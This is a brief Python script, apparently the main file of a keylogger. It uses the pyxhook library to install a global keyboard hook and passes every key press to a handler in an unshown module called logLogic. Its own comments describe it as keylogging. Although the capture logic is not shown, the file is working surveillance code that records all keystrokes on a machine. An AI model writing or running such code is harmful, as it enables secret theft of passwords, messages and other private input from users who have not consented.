
# import libs
import pyxhook
import subprocess
import time
import textwrap
import logLogic


def main():

    new_hook = pyxhook.HookManager()

    # Inhert Keylogging logic from pyxhook
    # & logLogic implemnts the OnKeyPress function
    new_hook.KeyDown = logLogic.OnKeyPress

    # Hook the keyboard
    new_hook.HookKeyboard()

    # start the session
    new_hook.start()


if __name__ == "__main__":
    main()
